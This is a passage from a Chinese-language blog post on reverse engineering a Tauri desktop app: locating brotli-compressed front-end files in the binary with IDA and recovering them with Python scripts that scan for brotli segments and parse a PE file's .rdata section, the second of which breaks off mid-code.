<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919100319004.png" alt="image-20250919100319004" style="zoom:50%;">

<p>可以看到这里的index.html，上下翻翻还有其他的资源文件</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919100517892.png" alt="image-20250919100517892" style="zoom:50%;">

<p>dump都是用同样的方法</p>
<p>因为IDA选中十六进制部分只能是一个长方形的区域块，所以难免会多选一部分（红色方框内是多的部分）</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919120653099.png" alt="image-20250919120653099"></p>
<p>保存的这部分打开后看一下，前面还有……&#x2F;index.html部分，这里不是brotli压缩的部分，需要删掉，或者在解压的时候直接跳过</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919120954359.png" alt="image-20250919120954359" style="zoom: 67%;">

<p>这时候就要问了，这个文件的大小怎么确定呢？</p>
<p>首先，肯定是有个地方存着这部分文件的大小的，看了有一篇<a href="https://blog.yllhwa.com/2023/05/09/Tauri%20%E6%A1%86%E6%9E%B6%E7%9A%84%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">文章</a>写到：</p>
<blockquote>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919121128485.png" alt="image-20250919121128485"></p>
</blockquote>
<p>但是我在IDA中查看的时候并没有发现一个类似的文件表结构，动态调试的时候貌似有一个rbx的某一步动态存储了这个文件的大小，但是由于比较复杂（其实是我懒）所以没有继续动态调试</p>
<p>但是稍加分析得出下面两种结论：</p>
<p><strong>1.这个文件后面还有其他文件</strong></p>
<p>比如之前的.&#x2F;styles.css部分，css这部分的brotli部分结束了之后后面紧接着是&#x2F;main.js，所以styles.css的结束就是&#x2F;main.js的前面，如下图</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919121639314.png" alt="image-20250919121639314" style="zoom:50%;">

<p><strong>2.这个文件后面没有其他文件</strong></p>
<p>就比如这个index.html，他后面不再有其他文件的开头作为他自己的结束的标志，所以只能大体找到一部分</p>
<p>但是其实根据IDA反编译出来的进行猜测，也能大概猜出最后一个文件的结尾是在哪里，后面颜色不一样还都是……000000……0000000……，并且数据看起来就不是一个正常文件，像是其他部分的一个什么头，所以红框内的应该就是index.html的结尾</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919122014317.png" alt="image-20250919122014317"></p>
<p>那么文件大小大概找到了之后，其实也可以直接写一个Python脚本进行解密了</p>
<p>由于我们dump出来的文件可能带有前面的不是brotli的部分和后面也不是brotli的部分，所以需要跳过前面或后面的一部分字节，找到中间真正的brotli压缩的部分。这时候使用Python是比较方便的，直接遍历，如果解压不了那就是偏移还不够，前后一起偏移，一点一点试，肯定能试出来</p>
<p>那么直接写一个Python小脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> brotli</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_all_brotli_segments</span>(<span class="params">data: <span class="built_in">bytes</span>, min_size: <span class="built_in">int</span> = <span class="number">10</span>, max_scan: <span class="built_in">int</span> = <span class="number">10000</span></span>) -&gt; <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">bytes</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在二进制数据中查找所有可能的brotli压缩段</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        data: 原始字节数据</span></span><br><span class="line"><span class="string">        min_size: brotli段的最小大小</span></span><br><span class="line"><span class="string">        max_scan: 最大扫描长度(避免过长搜索)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        list: [(解压后的数据, 开始位置, 结束位置), ...]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    found_segments = []</span><br><span class="line">    data_len = <span class="built_in">len</span>(data)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;开始扫描 <span class="subst">&#123;data_len&#125;</span> 字节的数据...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;最小段大小: <span class="subst">&#123;min_size&#125;</span>, 最大扫描长度: <span class="subst">&#123;max_scan&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历所有可能的起始位置</span></span><br><span class="line">    <span class="keyword">for</span> start_pos <span class="keyword">in</span> <span class="built_in">range</span>(data_len - min_size):</span><br><span class="line">        <span class="keyword">if</span> start_pos % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;扫描进度: <span class="subst">&#123;start_pos&#125;</span>/<span class="subst">&#123;data_len&#125;</span> (<span class="subst">&#123;start_pos/data_len*<span class="number">100</span>:<span class="number">.1</span>f&#125;</span>%)&quot;</span>, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 限制扫描长度以提高效率</span></span><br><span class="line">        max_end = <span class="built_in">min</span>(start_pos + max_scan, data_len)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 尝试不同的结束位置</span></span><br><span class="line">        <span class="keyword">for</span> end_pos <span class="keyword">in</span> <span class="built_in">range</span>(start_pos + min_size, max_end + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                candidate = data[start_pos:end_pos]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 尝试解压</span></span><br><span class="line">                decompressed = brotli.decompress(candidate)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 检查是否与已找到的段重叠</span></span><br><span class="line">                is_overlapping = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">for</span> _, existing_start, existing_end <span class="keyword">in</span> found_segments:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (end_pos &lt;= existing_start <span class="keyword">or</span> start_pos &gt;= existing_end):</span><br><span class="line">                        is_overlapping = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> is_overlapping:</span><br><span class="line">                    found_segments.append((decompressed, start_pos, end_pos))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n找到brotli段 #<span class="subst">&#123;<span class="built_in">len</span>(found_segments)&#125;</span>: 位置 <span class="subst">&#123;start_pos&#125;</span>-<span class="subst">&#123;end_pos&#125;</span> (长度:<span class="subst">&#123;end_pos-start_pos&#125;</span>), 解压后:<span class="subst">&#123;<span class="built_in">len</span>(decompressed)&#125;</span>字节&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 跳过这个段的剩余部分以避免重复检测</span></span><br><span class="line">                    start_pos = end_pos - <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n扫描完成! 总共找到 <span class="subst">&#123;<span class="built_in">len</span>(found_segments)&#125;</span> 个brotli段&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> found_segments</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_multiple_brotli</span>(<span class="params">file_path: <span class="built_in">str</span>, output_dir: <span class="built_in">str</span> = <span class="literal">None</span>, min_size: <span class="built_in">int</span> = <span class="number">10</span>, </span></span><br><span class="line"><span class="params">                           max_scan: <span class="built_in">int</span> = <span class="number">10000</span>, save_raw: <span class="built_in">bool</span> = <span class="literal">False</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    从文件中提取所有brotli段</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        file_path: 输入文件路径</span></span><br><span class="line"><span class="string">        output_dir: 输出目录</span></span><br><span class="line"><span class="string">        min_size: 最小brotli段大小</span></span><br><span class="line"><span class="string">        max_scan: 最大扫描长度</span></span><br><span class="line"><span class="string">        save_raw: 是否保存原始压缩数据</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        bool: 是否成功</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取文件: <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 读取二进制文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件大小: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置输出目录</span></span><br><span class="line">        <span class="keyword">if</span> output_dir <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            base_name = os.path.splitext(os.path.basename(file_path))[<span class="number">0</span>]</span><br><span class="line">            output_dir = <span class="string">f&quot;<span class="subst">&#123;base_name&#125;</span>_extracted&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建输出目录</span></span><br><span class="line">        os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;输出目录: <span class="subst">&#123;output_dir&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 查找所有brotli段</span></span><br><span class="line">        segments = find_all_brotli_segments(data, min_size, max_scan)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> segments:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;未找到任何brotli压缩段&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 保存每个段</span></span><br><span class="line">        <span class="keyword">for</span> i, (decompressed_data, start_pos, end_pos) <span class="keyword">in</span> <span class="built_in">enumerate</span>(segments, <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 保存解压后的数据</span></span><br><span class="line">            decompressed_file = os.path.join(output_dir, <span class="string">f&quot;segment_<span class="subst">&#123;i:03d&#125;</span>_decompressed.dat&quot;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(decompressed_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(decompressed_data)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;段 <span class="subst">&#123;i&#125;</span>: 位置 <span class="subst">&#123;start_pos:06d&#125;</span>-<span class="subst">&#123;end_pos:06d&#125;</span>, 原始:<span class="subst">&#123;end_pos-start_pos:6d&#125;</span>字节, 解压:<span class="subst">&#123;<span class="built_in">len</span>(decompressed_data):6d&#125;</span>字节&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;      解压数据保存到: <span class="subst">&#123;decompressed_file&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 如果需要，保存原始压缩数据</span></span><br><span class="line">            <span class="keyword">if</span> save_raw:</span><br><span class="line">                raw_file = os.path.join(output_dir, <span class="string">f&quot;segment_<span class="subst">&#123;i:03d&#125;</span>_raw.br&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(raw_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(data[start_pos:end_pos])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;      原始数据保存到: <span class="subst">&#123;raw_file&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 尝试显示解压内容的预览</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(decompressed_data) &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="comment"># 尝试作为文本显示</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        preview = decompressed_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)[:<span class="number">100</span>]</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;      内容预览: <span class="subst">&#123;<span class="built_in">repr</span>(preview)&#125;</span><span class="subst">&#123;<span class="string">&#x27;...&#x27;</span> <span class="keyword">if</span> <span class="built_in">len</span>(decompressed_data) &gt; <span class="number">100</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                        <span class="comment"># 显示十六进制</span></span><br><span class="line">                        hex_preview = decompressed_data[:<span class="number">20</span>].<span class="built_in">hex</span>()</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;      十六进制预览: <span class="subst">&#123;hex_preview&#125;</span><span class="subst">&#123;<span class="string">&#x27;...&#x27;</span> <span class="keyword">if</span> <span class="built_in">len</span>(decompressed_data) &gt; <span class="number">20</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 生成摘要文件</span></span><br><span class="line">        summary_file = os.path.join(output_dir, <span class="string">&quot;extraction_summary.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(summary_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">f&quot;Brotli提取摘要\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;================\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;源文件: <span class="subst">&#123;file_path&#125;</span>\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;文件大小: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> 字节\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;找到段数: <span class="subst">&#123;<span class="built_in">len</span>(segments)&#125;</span>\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;扫描参数: 最小大小=<span class="subst">&#123;min_size&#125;</span>, 最大扫描长度=<span class="subst">&#123;max_scan&#125;</span>\n\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> i, (decompressed_data, start_pos, end_pos) <span class="keyword">in</span> <span class="built_in">enumerate</span>(segments, <span class="number">1</span>):</span><br><span class="line">                f.write(<span class="string">f&quot;段 <span class="subst">&#123;i&#125;</span>:\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;  位置: <span class="subst">&#123;start_pos&#125;</span> - <span class="subst">&#123;end_pos&#125;</span>\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;  原始大小: <span class="subst">&#123;end_pos - start_pos&#125;</span> 字节\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;  解压大小: <span class="subst">&#123;<span class="built_in">len</span>(decompressed_data)&#125;</span> 字节\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;  压缩比: <span class="subst">&#123;<span class="built_in">len</span>(decompressed_data)/(end_pos-start_pos):<span class="number">.2</span>f&#125;</span>x\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">f&quot;  解压文件: segment_<span class="subst">&#123;i:03d&#125;</span>_decompressed.dat\n&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> save_raw:</span><br><span class="line">                    f.write(<span class="string">f&quot;  原始文件: segment_<span class="subst">&#123;i:03d&#125;</span>_raw.br\n&quot;</span>)</span><br><span class="line">                f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;提取摘要保存到: <span class="subst">&#123;summary_file&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n总计提取了 <span class="subst">&#123;<span class="built_in">len</span>(segments)&#125;</span> 个brotli段&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 &#x27;<span class="subst">&#123;file_path&#125;</span>&#x27; 不存在&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;从二进制文件中提取所有brotli压缩段&#x27;</span>,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用示例:</span></span><br><span class="line"><span class="string">  python multi_brotli_extractor.py file.bin</span></span><br><span class="line"><span class="string">  python multi_brotli_extractor.py file.bin --output-dir extracted --save-raw</span></span><br><span class="line"><span class="string">  python multi_brotli_extractor.py file.bin --min-size 50 --max-scan 50000</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    parser.add_argument(<span class="string">&#x27;input_file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;输入的二进制文件路径&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output-dir&#x27;</span>, <span class="string">&#x27;-o&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;输出目录路径 (默认: &#123;filename&#125;_extracted)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--min-size&#x27;</span>, <span class="string">&#x27;-m&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">10</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;brotli段的最小大小 (默认: 10)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--max-scan&#x27;</span>, <span class="string">&#x27;-s&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">10000</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;单个段的最大扫描长度 (默认: 10000)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--save-raw&#x27;</span>, <span class="string">&#x27;-r&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;同时保存原始压缩数据&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--quiet&#x27;</span>, <span class="string">&#x27;-q&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;减少输出信息&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> args.quiet:</span><br><span class="line">        <span class="comment"># 重定向print到null</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        sys.stdout = <span class="built_in">open</span>(os.devnull, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    success = extract_multiple_brotli(</span><br><span class="line">        args.input_file,</span><br><span class="line">        args.output_dir,</span><br><span class="line">        args.min_size,</span><br><span class="line">        args.max_scan,</span><br><span class="line">        args.save_raw</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> args.quiet:</span><br><span class="line">        sys.stdout = sys.__stdout__</span><br><span class="line">    </span><br><span class="line">    sys.exit(<span class="number">0</span> <span class="keyword">if</span> success <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>上面这个脚本可以同时处理存在多段brotli的二进制数据</p>
<p>所以，比如从这里开始选：</p>
<img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919124544923.png" alt="image-20250919124544923" style="zoom:50%;">

<p>一直选到index.html的后面部分，然后直接运行脚本</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919124636155.png" alt="image-20250919124636155"></p>
<p>然后就直接保存下了三段解出的数据</p>
<p><img src="/2025/09/19/Tauri-%E9%80%86%E5%90%91/image-20250919124736658.png" alt="image-20250919124736658"></p>
<p>分别就是styles.css，main.js，index.html</p>
<p>下面还有一个脚本，是直接解析PE文件中的.rdata段中的所有brotli数据的，但是这个脚本运行起来非常慢，仅供参考</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> brotli</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PEParser</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;简单的PE文件解析器，用于提取.rdata段&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, file_path: <span class="built_in">str</span></span>):</span><br><span class="line">        self.file_path = file_path</span><br><span class="line">        self.sections = []</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;解析PE文件结构&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="comment"># 读取DOS头</span></span><br><span class="line">                dos_header = f.read(<span class="number">64</span>)</span><br><span class="line">                <span class="keyword">if</span> dos_header[:<span class="number">2</span>] != <span class="string">b&#x27;MZ&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;错误: 不是有效的PE文件 (缺少MZ签名)&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 获取PE头偏移</span></span><br><span class="line">                pe_offset = struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, dos_header[<span class="number">60</span>:<span class="number">64</span>])[<span class="number">0</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 跳到PE头</span></span><br><span class="line">                f.seek(pe_offset)</span><br><span class="line">                pe_signature = f.read(<span class="number">4</span>)</span><br><span class="line">                <span class="keyword">if</span> pe_signature != <span class="string">b&#x27;PE\x00\x00&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;错误: 不是有效的PE文件 (缺少PE签名)&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 读取COFF头</span></span><br><span class="line">                coff_header = f.read(<span class="number">20</span>)</span><br><span class="line">                machine, num_sections, timestamp, ptr_to_sym, num_symbols, opt_header_size, characteristics = struct.unpack(<span class="string">&#x27;&lt;HHIIIHH&#x27;</span>, coff_header)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 跳过可选头</span></span><br><span class="line">                f.seek(pe_offset + <span class="number">24</span> + opt_header_size)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 读取节表</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_sections):</span><br><span class="line">                    section_header = f.read(<span class="number">40</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(section_header) &lt; <span class="number">40</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                        </span><br><span class="line">                    name = section_header[:<span class="number">8</span>].rstrip(<span class="string">b&#x27;\x00&#x27;</span>).decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                    virtual_size, virtual_address, size_of_raw_data, ptr_to_raw_data = struct.unpack(<span class="string">&#x27;&lt;IIII&#x27;</span>, section_header[<span class="number">8</span>:<span class="number">24</span>])</span><br><span class="line">                    </span><br><span class="line">                    self.sections.append(&#123;</span><br><span class="line">                        <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">                        <span class="string">&#x27;virtual_size&#x27;</span>: virtual_size,</span><br><span class="line">                        <span class="string">&#x27;virtual_address&#x27;</span>: virtual_address,</span><br><span class="line">                        <span class="string">&#x27;size_of_raw_data&#x27;</span>: size_of_raw_data,</span><br><span class="line">                        <span class="string">&#x27;ptr_to_raw_data&#x27;</span>: ptr_to_raw_data</span><br><span class="line">                    &#125;)</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;成功解析PE文件，找到 <span class="subst">&#123;<span class="built_in">len</span>(self.sections)&#125;</span> 个节:&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> section <span class="keyword">in</span> self.sections:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;section[<span class="string">&#x27;name&#x27;</span>]:<span class="number">10</span>&#125;</span> - 大小: <span class="subst">&#123;section[<span class="string">&#x27;size_of_raw_data&#x27;</span>]:<span class="number">8</span>&#125;</span> 字节, 偏移: 0x<span class="subst">&#123;section[<span class="string">&#x27;ptr_to_raw_data&#x27;</span>]:08x&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;解析PE文件时出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_rdata_section</span>(<span class="params">self</span>) -&gt; <span class="type">Optional</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取.rdata段的偏移和大小&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> section <span class="keyword">in</span> self.sections:</span><br><span class="line">            <span class="keyword">if</span> section[<span class="string">&#x27;name&#x27;</span>].lower() == <span class="string">&#x27;.rdata&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> section[<span class="string">&#x27;ptr_to_raw_data&#x27;</span>], section[<span class="string">&#x27;size_of_raw_data&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_rdata</span>(<span class="params">self</span>) -&gt; <span class="type">Optional</span>[<span class="built_in">bytes</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;提取.rdata段的数据&quot;&quot;&quot;</span></span><br><span class="line">        rdata_info = self.get_rdata_section()</span><br><span class="line">        <span class="keyword">if</span> rdata_info <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;错误: 未找到.rdata段&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        offset, size = rdata_info</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.seek(offset)</span><br><span class="line">                rdata = 